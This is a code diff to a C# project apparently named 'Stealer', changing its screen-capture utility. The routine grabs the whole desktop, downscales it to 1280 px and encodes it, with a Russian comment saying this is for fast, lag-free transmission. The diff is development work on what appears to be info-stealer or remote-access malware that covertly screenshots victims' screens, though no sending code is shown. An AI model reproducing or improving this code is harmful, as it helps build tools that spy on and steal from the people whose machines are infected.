@@ -51,20 +51,49 @@ namespace Stealer.Utils
         {
             try
             {
-                int w = GetScreenWidth();
-                int h = GetScreenHeight();
-                if (w <= 0 || h <= 0) return null;
+                int srcW = GetScreenWidth();
+                int srcH = GetScreenHeight();
+                if (srcW <= 0 || srcH <= 0) return null;
 
-                using (var bmp = new Bitmap(w, h, PixelFormat.Format24bppRgb))
+                // Даунскейлинг до max 1280px по ширине для молниеносной передачи без лагов
+                int targetW = srcW;
+                int targetH = srcH;
+                if (srcW > 1280)
                 {
-                    using (var g = Graphics.FromImage(bmp))
+                    targetW = 1280;
+                    targetH = (int)((double)srcH * 1280 / srcW);
+                }
+
+                using (var srcBmp = new Bitmap(srcW, srcH, PixelFormat.Format24bppRgb))
+                {
+                    using (var g = Graphics.FromImage(srcBmp))
                     {
-                        g.CopyFromScreen(0, 0, 0, 0, new Size(w, h), CopyPixelOperation.SourceCopy);
+                        g.CopyFromScreen(0, 0, 0, 0, new Size(srcW, srcH), CopyPixelOperation.SourceCopy);
                     }
-                    using (var ms = new MemoryStream())
+
+                    if (targetW != srcW || targetH != srcH)
                     {
-                        bmp.Save(ms, encoder, encParams);
-                        return ms.ToArray();
+                        using (var resizedBmp = new Bitmap(targetW, targetH, PixelFormat.Format24bppRgb))
+                        {
+                            using (var gResize = Graphics.FromImage(resizedBmp))
+                            {
+                                gResize.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
+                                gResize.DrawImage(srcBmp, 0, 0, targetW, targetH);
+                            }
+                            using (var ms = new MemoryStream())
+                            {
+                                resizedBmp.Save(ms, encoder, encParams);
+                                return ms.ToArray();
+                            }
+                        }
+                    }
+                    else
+                    {
+                        using (var ms = new MemoryStream())
+                        {
+                            srcBmp.Save(ms, encoder, encParams);
+                            return ms.ToArray();
+                        }
                     }
                 }
             }
